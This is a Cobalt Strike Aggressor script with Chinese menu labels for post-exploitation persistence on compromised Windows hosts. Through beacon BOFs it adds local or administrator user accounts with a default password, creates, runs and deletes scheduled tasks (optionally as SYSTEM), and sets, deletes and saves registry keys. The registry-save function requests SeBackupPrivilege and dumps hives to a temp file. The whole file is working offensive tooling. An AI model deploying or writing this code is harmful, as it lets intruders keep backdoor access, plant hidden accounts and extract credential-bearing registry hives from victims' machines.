#Persistence

beacon_command_register("adduser", "Add a new user", "Usage: adduser <username> <password> <description> <user_type>");

## ======================================== 全局变量区域 ===========================================##
%reghives = %(
		HKCR => 0,
		HKCU => 1,
		HKLM => 2,
		HKU  => 3
);
	
%regtypes = %(
	REG_SZ => 1,
	REG_EXPAND_SZ => 2,
	REG_BINARY => 3,
	REG_DWORD => 4,
	REG_MULTI_SZ => 7,
	REG_QWORD => 11
);
	
%inttypes = %( 
	REG_DWORD => 1, 
	REG_QWORD => 1
);


menu "权限维持" {
    menu "用户管理" {
        item "添加用户" {
			local('$bid');
			foreach $bid ($1){
				&adduser_dialog($bid);
			}	
        }
				
		item "删除用户" {
			local('$bid');
			foreach $bid ($1){
				&deleteuser_dialog($bid);
			}
        }
    }
	
	menu "计划任务操作"{
		item "创建计划任务"{
			local('$bid');
			foreach $bid ($1){
				&schtaskcreate_dialog($bid);
			}
		}
		
		item "删除计划任务"{
			local('$bid');
			foreach $bid ($1){
				&schtaskdelete_dialog($bid);
			}
		}
		
		item "启动计划任务"{
			local('$bid');
			foreach $bid ($1){
				&schtaskrun_dialog($bid);
			}
		}
		
		item "停止计划任务"{
			local('$bid');
			foreach $bid ($1){
				&schtaskstop_dialog($bid);
			}	
		}
		
		
		
	}
	
	
	menu "注册表操作" {
		item "修改注册表" {
			local('$bid');
			foreach $bid ($1){
				&regset_dialog($bid);
			}
		}		
		
		item "保存注册表" {
			local('$bid');
			foreach $bid ($1){
				&regsave_dialog($bid);
			}
		}
		
		item "删除注册表"{
			local('$bid');
			foreach $bid ($1){
				&regdelete_dialog($bid);
			}
		}
	}
	
}


## ============================================= 函数区域 ================================================
sub regset_dialog{
	$dialog = dialog("修改注册表", %(bid => $1,hostname => "",hive => "",path => "",key => "",type => "",value => ""), &regset);
	drow_text($dialog, "hostname", "主机名(可选):");
	drow_combobox($dialog, "hive", "主键:", @("HKCR", "HKCU","HKLM","HKU"));
	drow_text($dialog, "path", "路径:");
	drow_text($dialog, "key", "键:");
	drow_combobox($dialog, "type", "键类型", @("REG_SZ", "REG_EXPAND_SZ","REG_BINARY","REG_DWORD","REG_MULTI_SZ","REG_QWORD"));
	drow_text($dialog, "value", "键值:");
	dbutton_action($dialog, "设置");
	dialog_show($dialog);
}
		
sub regset{
	local('$bid $path $key $packstr $args $hive $hostname $type $buffer $value $fp');
	$bid = $3['bid'];
	$path = $3['path'];
	$key = $3['key'];
	$packstr = "zizzi";
	
	if( $3['hostname'] eq ""){
		$hostname = $null;
	}
	else{
		$hostname = "\\\\" . $3['hostname'];
	}
	
	
	if ($3['hive'] in %reghives){
		$hive = %reghives[$3['hive']];
	}
	if ($3['type'] in %regtypes){
		$type = %regtypes[$3['type']];
		if ($3['type'] in %inttypes){
			$packstr = $packstr . "b";
			$value =  pack("I-", $3['value']);	
		}
		else if ($3['type'] eq "REG_MULTI_SZ"){
			$packstr = $packstr . "b";
			$buffer = allocate(0);
			for (; $i < 6; $i++)
			{
				bwrite($buffer, "z",  $3['value']);
			}
			bwrite($buffer, "z", ""); # null terminator at end
			closef($buffer);
			$value = readb($buffer, -1);
		}
		else if ($3['type'] eq "REG_EXPAND_SZ" || $3['type'] eq "REG_SZ"){
			$packstr = $packstr . "z";
			$value = $3['value'];

		}
		else if ($3['type'] eq "REG_BINARY"){
			
			if (!-canread $3['value']){
			berror($bid, "File " . $3['value'] . " Could not be found");
			return;
			}
			$fp = openf($3['value']);
			$value = readb($fp, -1);
			$packstr = $packstr . "b";
			closef($fp);
		}
		else{
			berror($bid, "Provided registry type value is invalid");
			return;
		}
		
		$args = bof_pack($bid, $packstr, $hostname, $hive, $path, $key, $type, $value);
		beacon_inline_execute($bid, readbof($bid, "reg_set"), "go", $args);
	}
}

sub regsave_dialog{
	$dialog = dialog("保存注册表", %(bid => $1,hive => "HKCU",path => "",output => "C:\\Windows\\Temp\\reg.hiv"), &regsave);
	drow_combobox($dialog, "hive", "主键:", @("HKCR", "HKCU","HKLM","HKU"));
	drow_text($dialog, "path", "路径:");
	drow_text($dialog, "output", "输出文件:");
	dbutton_action($dialog, "保存");
	dialog_show($dialog);
}

sub regsave{
	local('$bid $hive $path $output $args');
	$bid = $3['bid'];
	$hive = %reghives[$3['hive']];
	$path = $3['path'];
	$output = $3['output'];
	
	blog($bid, "Requesting to backup privileges");
	bgetprivs($bid, "SeBackupPrivilege");
	
	blog($bid, "Attempting to save registry key $2\\$path to location $output");
	$args = bof_pack($bid, "zzi", $path, $output, $hive);
	beacon_inline_execute($bid, readbof($bid, "reg_save"), "go", $args);
}

sub regdelete_dialog{
	$dialog = dialog("删除注册表", %(bid => $1,hostname => "",hive => "",path => "",key => ""), &regdelete);
	dialog_description($dialog, "若键为空,则删除整个注册表路径");
	drow_text($dialog, "hostname", "主机名(可选):");
	drow_combobox($dialog, "hive", "主键:", @("HKCR", "HKCU","HKLM","HKU"));
	drow_text($dialog, "path", "路径:");
	drow_text($dialog, "key", "键(可选):");
	dbutton_action($dialog, "删除");
	dialog_show($dialog);
}
		
sub regdelete{
	local('$bid $path $key $packstr $args $hive $hostname');
	$bid = $3['bid'];
	$path = $3['path'];
	$key = $3['key'];
	$packstr = "zizzi";
	
	if($3['hostname'] eq ""){
		$hostname = $null;
	}
	else{
		$hostname = "\\\\" . $3['hostname'];
	}
	if ($3['hive'] in %reghives){
		$hive = %reghives[$3['hive']];
	}
	if ($key eq ""){
		$delkey = 1;	
	}
	else{
		$delkey = 0;
	}
	$args = bof_pack($bid,$packstr,$hostname, $hive, $path,$key,$delkey);
	beacon_inline_execute($bid, readbof($bid, "reg_delete"), "go", $args);
	
}


sub adduser_dialog{
	$dialog = dialog("请填写需添加用户的相关信息", %(bid => $1,username => "test1", password => "qq123456", description => "", user_type => "普通用户"), &adduser);
	drow_text($dialog, "username", "请输入用户账号:");
	drow_text($dialog, "password", "请输入用户密码:");
	drow_text($dialog, "description", "请输入用户描述信息:");
	drow_combobox($dialog, "user_type", "用户类型", @("普通用户", "管理员"));
	dbutton_action($dialog, "添加");
	dialog_show($dialog);
}
		
sub adduser {
	local('$bid $data $args');
	$bid = $3['bid'];
	$data = readbof($bid,"AddUser");
	$args = bof_pack($bid,"ZZZZ",$3['username'],$3['password'],$3['description'],$3['user_type']);
	beacon_inline_execute($bid, $data, "go", $args);
}

sub schtaskcreate_dialog{
	local('$dialog');
	$dialog = dialog("创建计划任务", %(bid => $1, hostname => "", taskpath => "\\taskname", usermode => "USER", forcemode => "CREATE", xmlpath => script_resource("scripts/persistence/task.xml")), &schtaskcreate);
	drow_text($dialog, "hostname",  "主机名(可选)：");
	drow_text($dialog, "taskpath", "任务路径：");
	drow_combobox($dialog,"usermode", "执行用户：",@('USER','SYSTEM','XML'));
	drow_combobox($dialog, "forcemode", "创建模式：",@('CREATE','UPDATE'));
	drow_file($dialog, "xmlpath", "xml文件路径：");
	dbutton_action($dialog, "Launch");
	dialog_show($dialog);
}
		
sub schtaskcreate {
	local('$data $bid $args $hostname $mode $xmldata $usermode $forcemode $taskpath');
	$bid = $3['bid'];
	$taskpath = $3['taskpath'];
	
	if($3['usermode'] eq "USER")
	{
		$usermode = 0;
	}
	else if($3['usermode'] eq "SYSTEM")
	{
		$usermode = 1;
	}
	else if ($3['usermode'] eq "XML")
	{
		$usermode = 2;
	}
	$xmldata = readb(openf($3['xmlpath']),-1);
	$data = readbof($bid,'schtaskscreate');
	$args = bof_pack($bid,"ZZZii",$hostname,$taskpath,$xmldata,$usermode,$forcemode);
	beacon_inline_execute($bid,$data,"go",$args);
}

sub schtaskdelete_dialog{
	$dialog = dialog("删除计划任务", %(bid => $1, hostname => "", $taskpath => "", $mode => "TASK"), &schtaskdelete);
	dialog_description($dialog,"当删除模式为TASK时,仅删除指定任务名(需完整路径);当删除模式为FOLDER,则删除指定文件夹");
	drow_text($dialog, "hostname",  "主机名(可选)：");
	drow_text($dialog, "taskpath", "任务路径：");
	drow_combobox($dialog, "mode", "删除模式：",@('TASK','FOLDER'));
	dbutton_action($dialog, "删除");
	dialog_show($dialog);
}

sub schtaskdelete{
	$bid = $3['bid'];
	if ($3['mode'] eq "TASK"){
		$isfolder = 0;
	}else if ($3['mode'] eq "FOLDER"){
		$isfolder = 1;
	}
	
	$args = bof_pack($bid,"ZZi",$3['hostname'],$3['taskpath'],$isfolder);
	$data = readbof($bid,"schtasksdelete");
	beacon_inline_execute($bid,$data,"go",$args);
}

sub schtaskrun_dialog{
	$dialog = dialog("启动计划任务", %(bid => $1, hostname => "", $taskname => "\Explorer\taskname"), &schtaskrun);
	dialog_description($dialog,"启动指定计划任务(任务名需填写完整路径)");
	drow_text($dialog, "hostname",  "主机名(可选)：");
	drow_text($dialog, "taskname", "任务名");
	dbutton_action($dialog,"run");
	dialog_show($dialog);
}
		
sub schtaskrun{
	$bid = $3['bid'];
	$data = readbof($bid,'schtasksrun');
	$args = bof_pack($bid,"ZZ",$3['hostname'],$3['taskname']);
	beacon_inline_execute($bid,$data,"go",$args);
}

sub schtaskstop_dialog{
	$dialog = dialog("停止计划任务", %(bid => $1, hostname => "", $taskname => "\Explorer\taskname"), &schtaskstop);
	dialog_description($dialog,"停止指定计划任务(任务名需填写完整路径)");
	drow_text($dialog, "hostname",  "主机名(可选)：");
	drow_text($dialog, "taskname", "任务名");
	dbutton_action($dialog,"stop");
	dialog_show($dialog);
}
		
sub schtaskstop{
	$bid = $3['bid'];
	$data = readbof($bid,'schtasksstop');
	$args = bof_pack($bid,"ZZ",$3['hostname'],$3['taskname']);
	beacon_inline_execute($bid,$data,"go",$args);
}





